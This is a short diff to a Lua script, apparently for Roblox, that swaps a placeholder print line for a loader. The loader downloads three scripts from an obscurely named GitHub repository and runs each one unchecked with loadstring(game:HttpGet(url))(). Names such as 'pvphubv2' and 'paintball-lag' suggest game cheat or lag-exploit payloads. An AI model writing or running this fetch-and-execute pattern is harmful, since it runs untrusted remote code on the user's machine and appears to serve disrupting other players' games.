@@ -1,1 +1,17 @@
-print("lol")
+local urls = {
+    "https://raw.githubusercontent.com/ggghhhsssttt/asdfghjklzxcvbnm/refs/heads/main/asdasdasd",
+    "https://raw.githubusercontent.com/ggghhhsssttt/asdfghjklzxcvbnm/refs/heads/main/pvphubv2",
+    "https://raw.githubusercontent.com/ggghhhsssttt/asdfghjklzxcvbnm/refs/heads/main/paintball-lag"
+}
+
+for _, url in ipairs(urls) do
+    task.spawn(function()
+        local ok, result = pcall(function()
+            return loadstring(game:HttpGet(url))()
+        end)
+
+        if not ok then
+            warn("Failed to execute: " .. url .. "\nError: " .. tostring(result))
+        end
+    end)
+end
